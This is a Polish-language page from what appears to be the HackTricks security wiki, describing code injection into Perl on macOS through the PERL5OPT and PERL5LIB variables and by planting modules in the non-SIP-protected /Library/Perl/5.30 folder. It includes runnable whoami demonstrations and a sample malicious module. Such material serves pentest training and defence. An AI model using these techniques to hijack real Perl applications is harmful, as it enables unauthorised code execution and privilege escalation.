# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Poprzez zmienną środowiskową `PERL5OPT` i `PERL5LIB`

Używając zmiennej środowiskowej PERL5OPT, można sprawić, że perl wykona dowolne polecenia.\
Na przykład, stwórz ten skrypt:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Teraz **wyeksportuj zmienną env** i uruchom skrypt **perl**:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Inną opcją jest stworzenie modułu Perl (np. `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
A następnie użyj zmiennych środowiskowych:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## Poprzez zależności

Możliwe jest wylistowanie kolejności folderów zależności uruchomionego Perla:
```bash
perl -e 'print join("\n", @INC)'
```
Co zwróci coś takiego jak:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Niektóre z zwróconych folderów nawet nie istnieją, jednak **`/Library/Perl/5.30`** **istnieje**, **nie jest** **chroniony** przez **SIP** i znajduje się **przed** folderami **chronionymi przez SIP**. Dlatego ktoś mógłby nadużyć tego folderu, aby dodać tam zależności skryptów, tak aby skrypt Perl z wysokimi uprawnieniami mógł go załadować.

> [!WARNING]
> Należy jednak pamiętać, że **musisz być rootem, aby pisać w tym folderze** i obecnie otrzymasz ten **monit TCC**:

<figure><img src="../../../images/image (28).png" alt="" width="244"><figcaption></figcaption></figure>

Na przykład, jeśli skrypt importuje **`use File::Basename;`**, możliwe byłoby utworzenie `/Library/Perl/5.30/File/Basename.pm`, aby wykonać dowolny kod.

## References

- [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)

{{#include ../../../banners/hacktricks-training.md}}
